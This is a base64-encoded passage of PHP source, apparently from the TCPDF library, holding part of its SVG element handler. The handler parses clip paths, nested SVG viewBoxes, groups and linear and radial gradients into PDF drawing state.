ZiB0aGUgYXR0cmlidXRlcyBjYW4gYmUgcmV0cmlldmVkIGJ5IHdhbGtpbmcgdGhyb3VnaCBhdHRyaWJzIHRoZSBub3JtYWwgd2F5LCB1c2luZyBlYWNoKCkuIFRoZSBmaXJzdCBrZXkgaW4gdGhlIGFycmF5IHdhcyB0aGUgZmlyc3QgYXR0cmlidXRlLCBhbmQgc28gb24uCgkgKiBAcGFyYW0gYXJyYXkgJGN0bSB0cmFuZm9ybWF0aW9uIG1hdHJpeCBmb3IgY2xpcHBpbmcgbW9kZSAoc3RhcnRpbmcgdHJhbnNmb3JtYXRpb24gbWF0cml4KS4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHN0YXJ0U1ZHRWxlbWVudEhhbmRsZXIoJHBhcnNlciwgJG5hbWUsICRhdHRyaWJzLCAkY3RtPWFycmF5KCkpIHsKCQkkbmFtZSA9ICR0aGlzLT5yZW1vdmVUYWdOYW1lc3BhY2UoJG5hbWUpOwoJCS8vIGNoZWNrIGlmIHdlIGFyZSBpbiBjbGlwIG1vZGUKCQlpZiAoJHRoaXMtPnN2Z2NsaXBtb2RlKSB7CgkJCSR0aGlzLT5zdmdjbGlwcGF0aHNbJHRoaXMtPnN2Z2NsaXBpZF1bXSA9IGFycmF5KCduYW1lJyA9PiAkbmFtZSwgJ2F0dHJpYnMnID0+ICRhdHRyaWJzLCAndG0nID0+ICR0aGlzLT5zdmdjbGlwdG1bJHRoaXMtPnN2Z2NsaXBpZF0pOwoJCQlyZXR1cm47CgkJfQoJCWlmICgkdGhpcy0+c3ZnZGVmc21vZGUgQU5EICFpbl9hcnJheSgkbmFtZSwgYXJyYXkoJ2NsaXBQYXRoJywgJ2xpbmVhckdyYWRpZW50JywgJ3JhZGlhbEdyYWRpZW50JywgJ3N0b3AnKSkpIHsKCQkJaWYgKGlzc2V0KCRhdHRyaWJzWydpZCddKSkgewoJCQkJJGF0dHJpYnNbJ2NoaWxkX2VsZW1lbnRzJ10gPSBhcnJheSgpOwoJCQkJJHRoaXMtPnN2Z2RlZnNbJGF0dHJpYnNbJ2lkJ11dID0gYXJyYXkoJ25hbWUnID0+ICRuYW1lLCAnYXR0cmlicycgPT4gJGF0dHJpYnMpOwoJCQkJcmV0dXJuOwoJCQl9CgkJCWlmIChlbmQoJHRoaXMtPnN2Z2RlZnMpICE9PSBGQUxTRSkgewoJCQkJJGxhc3Rfc3ZnZGVmc19pZCA9IGtleSgkdGhpcy0+c3ZnZGVmcyk7CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnN2Z2RlZnNbJGxhc3Rfc3ZnZGVmc19pZF1bJ2F0dHJpYnMnXVsnY2hpbGRfZWxlbWVudHMnXSkpIHsKCQkJCQkkYXR0cmlic1snaWQnXSA9ICdERl8nLihjb3VudCgkdGhpcy0+c3ZnZGVmc1skbGFzdF9zdmdkZWZzX2lkXVsnYXR0cmlicyddWydjaGlsZF9lbGVtZW50cyddKSArIDEpOwoJCQkJCSR0aGlzLT5zdmdkZWZzWyRsYXN0X3N2Z2RlZnNfaWRdWydhdHRyaWJzJ11bJ2NoaWxkX2VsZW1lbnRzJ11bJGF0dHJpYnNbJ2lkJ11dID0gYXJyYXkoJ25hbWUnID0+ICRuYW1lLCAnYXR0cmlicycgPT4gJGF0dHJpYnMpOwoJCQkJCXJldHVybjsKCQkJCX0KCQkJfQoJCQlyZXR1cm47CgkJfQoJCSRjbGlwcGluZyA9IGZhbHNlOwoJCWlmICgkcGFyc2VyID09ICdjbGlwLXBhdGgnKSB7CgkJCS8vIHNldCBjbGlwcGluZyBtb2RlCgkJCSRjbGlwcGluZyA9IHRydWU7CgkJfQoJCS8vIGdldCBzdHlsaW5nIHByb3BlcnRpZXMKCQkkcHJldl9zdmdzdHlsZSA9ICR0aGlzLT5zdmdzdHlsZXNbbWF4KDAsKGNvdW50KCR0aGlzLT5zdmdzdHlsZXMpIC0gMSkpXTsgLy8gcHJldmlvdXMgc3R5bGUKCQkkc3Znc3R5bGUgPSAkdGhpcy0+c3Znc3R5bGVzWzBdOyAvLyBzZXQgZGVmYXVsdCBzdHlsZQoJCWlmICgkY2xpcHBpbmcgQU5EICFpc3NldCgkYXR0cmlic1snZmlsbCddKSBBTkQgKCFpc3NldCgkYXR0cmlic1snc3R5bGUnXSkgT1IgKCFwcmVnX21hdGNoKCcvWztcIlxzXXsxfWZpbGxbXHNdKjpbXHNdKihbXjtcIl0qKS9zaScsICRhdHRyaWJzWydzdHlsZSddLCAkYXR0cnZhbCkpKSkgewoJCQkvLyBkZWZhdWx0IGZpbGwgYXR0cmlidXRlIGZvciBjbGlwcGluZwoJCQkkYXR0cmlic1snZmlsbCddID0gJ25vbmUnOwoJCX0KCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ3N0eWxlJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGF0dHJpYnNbJ3N0eWxlJ10pIEFORCAoJGF0dHJpYnNbJ3N0eWxlJ11bMF0gIT0gJzsnKSkgewoJCQkvLyBmaXggc3R5bGUgZm9yIHJlZ3VsYXIgZXhwcmVzc2lvbgoJCQkkYXR0cmlic1snc3R5bGUnXSA9ICc7Jy4kYXR0cmlic1snc3R5bGUnXTsKCQl9CgkJZm9yZWFjaCAoJHByZXZfc3Znc3R5bGUgYXMgJGtleSA9PiAkdmFsKSB7CgkJCWlmIChpbl9hcnJheSgka2V5LCBUQ1BERl9JTUFHRVM6OiRzdmdpbmhlcml0cHJvcCkpIHsKCQkJCS8vIGluaGVyaXQgcHJldmlvdXMgdmFsdWUKCQkJCSRzdmdzdHlsZVska2V5XSA9ICR2YWw7CgkJCX0KCQkJaWYgKGlzc2V0KCRhdHRyaWJzWyRrZXldKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRhdHRyaWJzWyRrZXldKSkgewoJCQkJLy8gc3BlY2lmaWMgYXR0cmlidXRlIHNldHRpbmdzCgkJCQlpZiAoJGF0dHJpYnNbJGtleV0gPT0gJ2luaGVyaXQnKSB7CgkJCQkJJHN2Z3N0eWxlWyRrZXldID0gJHZhbDsKCQkJCX0gZWxzZSB7CgkJCQkJJHN2Z3N0eWxlWyRrZXldID0gJGF0dHJpYnNbJGtleV07CgkJCQl9CgkJCX0gZWxzZWlmIChpc3NldCgkYXR0cmlic1snc3R5bGUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkYXR0cmlic1snc3R5bGUnXSkpIHsKCQkJCS8vIENTUyBzdHlsZSBzeW50YXgKCQkJCSRhdHRydmFsID0gYXJyYXkoKTsKCQkJCWlmIChwcmVnX21hdGNoKCcvWztcIlxzXXsxfScuJGtleS4nW1xzXSo6W1xzXSooW147XCJdKikvc2knLCAkYXR0cmlic1snc3R5bGUnXSwgJGF0dHJ2YWwpIEFORCBpc3NldCgkYXR0cnZhbFsxXSkpIHsKCQkJCQlpZiAoJGF0dHJ2YWxbMV0gPT0gJ2luaGVyaXQnKSB7CgkJCQkJCSRzdmdzdHlsZVska2V5XSA9ICR2YWw7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHN2Z3N0eWxlWyRrZXldID0gJGF0dHJ2YWxbMV07CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCS8vIHRyYW5zZm9ybWF0aW9uIG1hdHJpeAoJCWlmICghZW1wdHkoJGN0bSkpIHsKCQkJJHRtID0gJGN0bTsKCQl9IGVsc2UgewoJCQkkdG0gPSBhcnJheSgxLDAsMCwxLDAsMCk7CgkJfQoJCWlmIChpc3NldCgkYXR0cmlic1sndHJhbnNmb3JtJ10pIEFORCAhZW1wdHkoJGF0dHJpYnNbJ3RyYW5zZm9ybSddKSkgewoJCQkkdG0gPSBUQ1BERl9TVEFUSUM6OmdldFRyYW5zZm9ybWF0aW9uTWF0cml4UHJvZHVjdCgkdG0sIFRDUERGX1NUQVRJQzo6Z2V0U1ZHVHJhbnNmb3JtTWF0cml4KCRhdHRyaWJzWyd0cmFuc2Zvcm0nXSkpOwoJCX0KCQkkc3Znc3R5bGVbJ3RyYW5zZm1hdHJpeCddID0gJHRtOwoJCSRpbnZpc2libGUgPSBmYWxzZTsKCQlpZiAoKCRzdmdzdHlsZVsndmlzaWJpbGl0eSddID09ICdoaWRkZW4nKSBPUiAoJHN2Z3N0eWxlWyd2aXNpYmlsaXR5J10gPT0gJ2NvbGxhcHNlJykgT1IgKCRzdmdzdHlsZVsnZGlzcGxheSddID09ICdub25lJykpIHsKCQkJLy8gdGhlIGN1cnJlbnQgZ3JhcGhpY3MgZWxlbWVudCBpcyBpbnZpc2libGUgKG5vdGhpbmcgaXMgcGFpbnRlZCkKCQkJJGludmlzaWJsZSA9IHRydWU7CgkJfQoJCS8vIHByb2Nlc3MgdGFnCgkJc3dpdGNoKCRuYW1lKSB7CgkJCWNhc2UgJ2RlZnMnOiB7CgkJCQkkdGhpcy0+c3ZnZGVmc21vZGUgPSB0cnVlOwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gY2xpcFBhdGgKCQkJY2FzZSAnY2xpcFBhdGgnOiB7CgkJCQlpZiAoJGludmlzaWJsZSkgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJJHRoaXMtPnN2Z2NsaXBtb2RlID0gdHJ1ZTsKCQkJCWlmICghaXNzZXQoJGF0dHJpYnNbJ2lkJ10pKSB7CgkJCQkJJGF0dHJpYnNbJ2lkJ10gPSAnQ1BfJy4oY291bnQoJHRoaXMtPnN2Z2NsaXB0bSkgKyAxKTsKCQkJCX0KCQkJCSR0aGlzLT5zdmdjbGlwaWQgPSAkYXR0cmlic1snaWQnXTsKCQkJCSR0aGlzLT5zdmdjbGlwcGF0aHNbJHRoaXMtPnN2Z2NsaXBpZF0gPSBhcnJheSgpOwoJCQkJJHRoaXMtPnN2Z2NsaXB0bVskdGhpcy0+c3ZnY2xpcGlkXSA9ICR0bTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3N2Zyc6IHsKCQkJCS8vIHN0YXJ0IG9mIFNWRyBvYmplY3QKCQkJCWlmKCsrJHRoaXMtPnN2Z190YWdfZGVwdGggPD0gMSkgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJLy8gaW5uZXIgU1ZHCgkJCQlhcnJheV9wdXNoKCR0aGlzLT5zdmdzdHlsZXMsICRzdmdzdHlsZSk7CgkJCQkkdGhpcy0+U3RhcnRUcmFuc2Zvcm0oKTsKCQkJCSRzdmdYID0gKGlzc2V0KCRhdHRyaWJzWyd4J10pPyRhdHRyaWJzWyd4J106MCk7CgkJCQkkc3ZnWSA9IChpc3NldCgkYXR0cmlic1sneSddKT8kYXR0cmlic1sneSddOjApOwoJCQkJJHN2Z1cgPSAoaXNzZXQoJGF0dHJpYnNbJ3dpZHRoJ10pPyRhdHRyaWJzWyd3aWR0aCddOjApOwoJCQkJJHN2Z0ggPSAoaXNzZXQoJGF0dHJpYnNbJ2hlaWdodCddKT8kYXR0cmlic1snaGVpZ2h0J106MCk7CgkJCQkvLyBzZXQgeCwgeSBwb3NpdGlvbiB1c2luZyB0cmFuc2Zvcm0gbWF0cml4CgkJCQkkdG0gPSBUQ1BERl9TVEFUSUM6OmdldFRyYW5zZm9ybWF0aW9uTWF0cml4UHJvZHVjdCgkdG0sIGFycmF5KCAxLCAwLCAwLCAxLCAkc3ZnWCwgJHN2Z1kpKTsKCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCS8vIHNldCBjbGlwcGluZyBmb3Igd2lkdGggYW5kIGhlaWdodAoJCQkJJHggPSAwOwoJCQkJJHkgPSAwOwoJCQkJJHcgPSAoaXNzZXQoJGF0dHJpYnNbJ3dpZHRoJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3dpZHRoJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6JHRoaXMtPncpOwoJCQkJJGggPSAoaXNzZXQoJGF0dHJpYnNbJ2hlaWdodCddKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWydoZWlnaHQnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTokdGhpcy0+aCk7CgkJCQkvLyBkcmF3IGNsaXBwaW5nIHJlY3QKCQkJCSR0aGlzLT5SZWN0KCR4LCAkeSwgJHcsICRoLCAnQ05aJywgYXJyYXkoKSwgYXJyYXkoKSk7CgkJCQkvLyBwYXJzZSB2aWV3Ym94LCBjYWxjdWxhdGUgZXh0cmEgdHJhbnNmb3JtYXRpb24gbWF0cml4CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ3ZpZXdCb3gnXSkpIHsKCQkJCQkkdG1wID0gYXJyYXkoKTsKCQkJCQlwcmVnX21hdGNoX2FsbCgiL1swLTldKy8iLCAkYXR0cmlic1sndmlld0JveCddLCAkdG1wKTsKCQkJCQkkdG1wID0gJHRtcFswXTsKCQkJCQlpZiAoc2l6ZW9mKCR0bXApID09IDQpIHsKCQkJCQkJJHZ4ID0gJHRtcFswXTsKCQkJCQkJJHZ5ID0gJHRtcFsxXTsKCQkJCQkJJHZ3ID0gJHRtcFsyXTsKCQkJCQkJJHZoID0gJHRtcFszXTsKCQkJCQkJLy8gZ2V0IGFzcGVjdCByYXRpbwoJCQkJCQkkdG1wID0gYXJyYXkoKTsKCQkJCQkJJGFzcGVjdFggPSAneE1pZCc7CgkJCQkJCSRhc3BlY3RZID0gJ1lNaWQnOwoJCQkJCQkkZml0ID0gJ21lZXQnOwoJCQkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ3ByZXNlcnZlQXNwZWN0UmF0aW8nXSkpIHsKCQkJCQkJCWlmKCRhdHRyaWJzWydwcmVzZXJ2ZUFzcGVjdFJhdGlvJ10gPT0gJ25vbmUnKSB7CgkJCQkJCQkJJGZpdCA9ICdub25lJzsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJcHJlZ19tYXRjaF9hbGwoJy9bYS16QS1aXSsvJywgJGF0dHJpYnNbJ3ByZXNlcnZlQXNwZWN0UmF0aW8nXSwgJHRtcCk7CgkJCQkJCQkJJHRtcCA9ICR0bXBbMF07CgkJCQkJCQkJaWYgKChzaXplb2YoJHRtcCkgPT0gMikgQU5EIChzdHJsZW4oJHRtcFswXSkgPT0gOCkgQU5EIChpbl9hcnJheSgkdG1wWzFdLCBhcnJheSgnbWVldCcsICdzbGljZScsICdub25lJykpKSkgewoJCQkJCQkJCQkkYXNwZWN0WCA9IHN1YnN0cigkdG1wWzBdLCAwLCA0KTsKCQkJCQkJCQkJJGFzcGVjdFkgPSBzdWJzdHIoJHRtcFswXSwgNCwgNCk7CgkJCQkJCQkJCSRmaXQgPSAkdG1wWzFdOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQkkd3IgPSAoJHN2Z1cgLyAkdncpOwoJCQkJCQkkaHIgPSAoJHN2Z0ggLyAkdmgpOwoJCQkJCQkkYXggPSAkYXkgPSAwOwoJCQkJCQlpZiAoKCgkZml0ID09ICdtZWV0JykgQU5EICgkaHIgPCAkd3IpKSBPUiAoKCRmaXQgPT0gJ3NsaWNlJykgQU5EICgkaHIgPiAkd3IpKSkgewoJCQkJCQkJaWYgKCRhc3BlY3RYID09ICd4TWF4JykgewoJCQkJCQkJCSRheCA9ICgoJHZ3ICogKCR3ciAvICRocikpIC0gJHZ3KTsKCQkJCQkJCX0KCQkJCQkJCWlmICgkYXNwZWN0WCA9PSAneE1pZCcpIHsKCQkJCQkJCQkkYXggPSAoKCgkdncgKiAoJHdyIC8gJGhyKSkgLSAkdncpIC8gMik7CgkJCQkJCQl9CgkJCQkJCQkkd3IgPSAkaHI7CgkJCQkJCX0gZWxzZWlmICgoKCRmaXQgPT0gJ21lZXQnKSBBTkQgKCRociA+ICR3cikpIE9SICgoJGZpdCA9PSAnc2xpY2UnKSBBTkQgKCRociA8ICR3cikpKSB7CgkJCQkJCQlpZiAoJGFzcGVjdFkgPT0gJ1lNYXgnKSB7CgkJCQkJCQkJJGF5ID0gKCgkdmggKiAoJGhyIC8gJHdyKSkgLSAkdmgpOwoJCQkJCQkJfQoJCQkJCQkJaWYgKCRhc3BlY3RZID09ICdZTWlkJykgewoJCQkJCQkJCSRheSA9ICgoKCR2aCAqICgkaHIgLyAkd3IpKSAtICR2aCkgLyAyKTsKCQkJCQkJCX0KCQkJCQkJCSRociA9ICR3cjsKCQkJCQkJfQoJCQkJCQkkbmV3dG0gPSBhcnJheSgkd3IsIDAsIDAsICRociwgKCgkd3IgKiAoJGF4IC0gJHZ4KSkgLSAkc3ZnWCksICgoJGhyICogKCRheSAtICR2eSkpIC0gJHN2Z1kpKTsKCQkJCQkJJHRtID0gVENQREZfU1RBVElDOjpnZXRUcmFuc2Zvcm1hdGlvbk1hdHJpeFByb2R1Y3QoJHRtLCAkbmV3dG0pOwoJCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJfQoJCQkJfQoJCQkJJHRoaXMtPnNldFNWR1N0eWxlcygkc3Znc3R5bGUsICRwcmV2X3N2Z3N0eWxlKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2cnOiB7CgkJCQkvLyBncm91cCB0b2dldGhlciByZWxhdGVkIGdyYXBoaWNzIGVsZW1lbnRzCgkJCQlhcnJheV9wdXNoKCR0aGlzLT5zdmdzdHlsZXMsICRzdmdzdHlsZSk7CgkJCQkkdGhpcy0+U3RhcnRUcmFuc2Zvcm0oKTsKCQkJCSR4ID0gKGlzc2V0KCRhdHRyaWJzWyd4J10pPyRhdHRyaWJzWyd4J106MCk7CgkJCQkkeSA9IChpc3NldCgkYXR0cmlic1sneSddKT8kYXR0cmlic1sneSddOjApOwoJCQkJJHcgPSAxOy8vKGlzc2V0KCRhdHRyaWJzWyd3aWR0aCddKT8kYXR0cmlic1snd2lkdGgnXToxKTsKCQkJCSRoID0gMTsvLyhpc3NldCgkYXR0cmlic1snaGVpZ2h0J10pPyRhdHRyaWJzWydoZWlnaHQnXToxKTsKCQkJCSR0bSA9IFRDUERGX1NUQVRJQzo6Z2V0VHJhbnNmb3JtYXRpb25NYXRyaXhQcm9kdWN0KCR0bSwgYXJyYXkoJHcsIDAsIDAsICRoLCAkeCwgJHkpKTsKCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCSR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdsaW5lYXJHcmFkaWVudCc6IHsKCQkJCWlmICgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPCAyKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQlpZiAoIWlzc2V0KCRhdHRyaWJzWydpZCddKSkgewoJCQkJCSRhdHRyaWJzWydpZCddID0gJ0dSXycuKGNvdW50KCR0aGlzLT5zdmdncmFkaWVudHMpICsgMSk7CgkJCQl9CgkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRpZCA9ICRhdHRyaWJzWydpZCddOwoJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF0gPSBhcnJheSgpOwoJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ3R5cGUnXSA9IDI7CgkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnc3RvcHMnXSA9IGFycmF5KCk7CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2dyYWRpZW50VW5pdHMnXSkpIHsKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnZ3JhZGllbnRVbml0cyddID0gJGF0dHJpYnNbJ2dyYWRpZW50VW5pdHMnXTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ2dyYWRpZW50VW5pdHMnXSA9ICdvYmplY3RCb3VuZGluZ0JveCc7CgkJCQl9CgkJCQkvLyRhdHRyaWJzWydzcHJlYWRNZXRob2QnXQoJCQkJaWYgKCgoIWlzc2V0KCRhdHRyaWJzWyd4MSddKSkgQU5EICghaXNzZXQoJGF0dHJpYnNbJ3kxJ10pKSBBTkQgKCFpc3NldCgkYXR0cmlic1sneDInXSkpIEFORCAoIWlzc2V0KCRhdHRyaWJzWyd5MiddKSkpCgkJCQkJT1IgKChpc3NldCgkYXR0cmlic1sneDEnXSkgQU5EIChzdWJzdHIoJGF0dHJpYnNbJ3gxJ10sIC0xKSA9PSAnJScpKQoJCQkJCQlPUiAoaXNzZXQoJGF0dHJpYnNbJ3kxJ10pIEFORCAoc3Vic3RyKCRhdHRyaWJzWyd5MSddLCAtMSkgPT0gJyUnKSkKCQkJCQkJT1IgKGlzc2V0KCRhdHRyaWJzWyd4MiddKSBBTkQgKHN1YnN0cigkYXR0cmlic1sneDInXSwgLTEpID09ICclJykpCgkJCQkJCU9SIChpc3NldCgkYXR0cmlic1sneTInXSkgQU5EIChzdWJzdHIoJGF0dHJpYnNbJ3kyJ10sIC0xKSA9PSAnJScpKSkpIHsKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnbW9kZSddID0gJ3BlcmNlbnRhZ2UnOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnbW9kZSddID0gJ21lYXN1cmUnOwoJCQkJfQoJCQkJJHgxID0gKGlzc2V0KCRhdHRyaWJzWyd4MSddKT8kYXR0cmlic1sneDEnXTonMCcpOwoJCQkJJHkxID0gKGlzc2V0KCRhdHRyaWJzWyd5MSddKT8kYXR0cmlic1sneTEnXTonMCcpOwoJCQkJJHgyID0gKGlzc2V0KCRhdHRyaWJzWyd4MiddKT8kYXR0cmlic1sneDInXTonMTAwJyk7CgkJCQkkeTIgPSAoaXNzZXQoJGF0dHJpYnNbJ3kyJ10pPyRhdHRyaWJzWyd5MiddOicwJyk7CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2dyYWRpZW50VHJhbnNmb3JtJ10pKSB7CgkJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ2dyYWRpZW50VHJhbnNmb3JtJ10gPSBUQ1BERl9TVEFUSUM6OmdldFNWR1RyYW5zZm9ybU1hdHJpeCgkYXR0cmlic1snZ3JhZGllbnRUcmFuc2Zvcm0nXSk7CgkJCQl9CgkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnY29vcmRzJ10gPSBhcnJheSgkeDEsICR5MSwgJHgyLCAkeTIpOwoJCQkJaWYgKGlzc2V0KCRhdHRyaWJzWyd4bGluazpocmVmJ10pIEFORCAhZW1wdHkoJGF0dHJpYnNbJ3hsaW5rOmhyZWYnXSkpIHsKCQkJCQkvLyBncmFkaWVudCBpcyBkZWZpbmVkIG9uIGFub3RoZXIgcGxhY2UKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsneHJlZiddID0gc3Vic3RyKCRhdHRyaWJzWyd4bGluazpocmVmJ10sIDEpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAncmFkaWFsR3JhZGllbnQnOiB7CgkJCQlpZiAoJHRoaXMtPnBkZmFfbW9kZSAmJiAkdGhpcy0+cGRmYV92ZXJzaW9uIDwgMikgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJaWYgKCFpc3NldCgkYXR0cmlic1snaWQnXSkpIHsKCQkJCQkkYXR0cmlic1snaWQnXSA9ICdHUl8nLihjb3VudCgkdGhpcy0+c3ZnZ3JhZGllbnRzKSArIDEpOwoJCQkJfQoJCQkJJHRoaXMtPnN2Z2dyYWRpZW50aWQgPSAkYXR0cmlic1snaWQnXTsKCQkJCSR0aGlzLT5zdmdncmFkaWVudHNbJHRoaXMtPnN2Z2dyYWRpZW50aWRdID0gYXJyYXkoKTsKCQkJCSR0aGlzLT5zdmdncmFkaWVudHNbJHRoaXMtPnN2Z2dyYWRpZW50aWRdWyd0eXBlJ10gPSAzOwoJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ3N0b3BzJ10gPSBhcnJheSgpOwoJCQkJaWYgKGlzc2V0KCRhdHRyaWJzWydncmFkaWVudFVuaXRzJ10pKSB7CgkJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ2dyYWRpZW50VW5pdHMnXSA9ICRhdHRyaWJzWydncmFkaWVudFVuaXRzJ107CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5zdmdncmFkaWVudHNbJHRoaXMtPnN2Z2dyYWRpZW50aWRdWydncmFkaWVudFVuaXRzJ10gPSAnb2JqZWN0Qm91bmRpbmdCb3gnOwoJCQkJfQoJCQkJLy8kYXR0cmlic1snc3ByZWFkTWV0aG9kJ10KCQkJCWlmICgoKCFpc3NldCgkYXR0cmlic1snY3gnXSkpIEFORCAoIWlzc2V0KCRhdHRyaWJzWydjeSddKSkpCgkJCQkJT1IgKChpc3NldCgkYXR0cmlic1snY3gnXSkgQU5EIChzdWJzdHIoJGF0dHJpYnNbJ2N4J10sIC0xKSA9PSAnJScpKQoJCQkJCU9SIChpc3NldCgkYXR0cmlic1snY3knXSkgQU5EIChzdWJzdHIoJGF0dHJpYnNbJ2N5J10sIC0xKSA9PSAnJScpKSkpIHsKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnbW9kZSddID0gJ3BlcmNlbnRhZ2UnOwoJCQkJfSBlbHNlaWYgKGlzc2V0KCRhdHRyaWJzWydyJ10pIEFORCBpc19udW1lcmljKCRhdHRyaWJzWydyJ10pIEFORCAoJGF0dHJpYnNbJ3InXSkgPD0gMSkgewoJCQkJCSR0aGlzLT5zdmdncmFkaWVudHNbJHRoaXMtPnN2Z2dyYWRpZW50aWRdWydtb2RlJ10gPSAncmF0aW8nOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnbW9kZSddID0gJ21lYXN1cmUnOwoJCQkJfQoJCQkJJGN4ID0gKGlzc2V0KCRhdHRyaWJzWydjeCddKSA/ICRhdHRyaWJzWydjeCddIDogMC41KTsKCQkJCSRjeSA9IChpc3NldCgkYXR0cmlic1snY3knXSkgPyAkYXR0cmlic1snY3knXSA6IDAuNSk7CgkJCQkkZnggPSAoaXNzZXQoJGF0dHJpYnNbJ2Z4J10pID8gJGF0dHJpYnNbJ2Z4J10gOiAkY3gpOwoJCQkJJGZ5ID0gKGlzc2V0KCRhdHRyaWJzWydmeSddKSA/ICRhdHRyaWJzWydmeSddIDogJGN5KTsKCQkJCSRyID0gKGlzc2V0KCRhdHRyaWJzWydyJ10pID8gJGF0dHJpYnNbJ3InXSA6IDAuNSk7CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2dyYWRpZW50VHJhbnNmb3JtJ10pKSB7CgkJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ2dyYWRpZW50VHJhbnNmb3JtJ10gPSBUQ1BERl9TVEFUSUM6OmdldFNWR1RyYW5zZm9ybU1hdHJpeCgkYXR0cmlic1snZ3JhZGllbnRUcmFuc2Zvcm0nXSk7CgkJCQl9CgkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRzWyR0aGlzLT5zdmdncmFkaWVudGlkXVsnY29vcmRzJ10gPSBhcnJheSgkY3gsICRjeSwgJGZ4LCAkZnksICRyKTsKCQkJCWlmIChpc3NldCgkYXR0cmlic1sneGxpbms6aHJlZiddKSBBTkQgIWVtcHR5KCRhdHRyaWJzWyd4bGluazpocmVmJ10pKSB7CgkJCQkJLy8gZ3JhZGllbnQgaXMgZGVmaW5lZCBvbiBhbm90aGVyIHBsYWNlCgkJCQkJJHRoaXMtPnN2Z2dyYWRpZW50c1skdGhpcy0+c3ZnZ3JhZGllbnRpZF1bJ3hyZWYnXSA9IHN1YnN0cigkYXR0cmlic1sneGxpbms6aHJlZiddLCAxKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3N0b3AnOiB7CgkJCQkvLyBncmFkaWVudCBzdG9wcwoJCQkJaWYgKHN1YnN0cigkYXR0cmlic1snb2Zmc2V0J10sIC0xKSA9PSAnJScpIHsKCQkJCQkkb2Zmc2V0ID0gZmxvYXR2YWwoc3Vic3RyKCRhdHRyaWJzWydvZmZzZXQnXSwgMCwgLTEpKSAvIDEwMDsKCQkJCX0gZWxzZSB7CgkJCQkJJG9mZnNldCA9IGZsb2F0dmFsKCRhdHRyaWJzWydvZmZzZXQnXSk7CgkJCQkJaWYgKCRvZmZzZX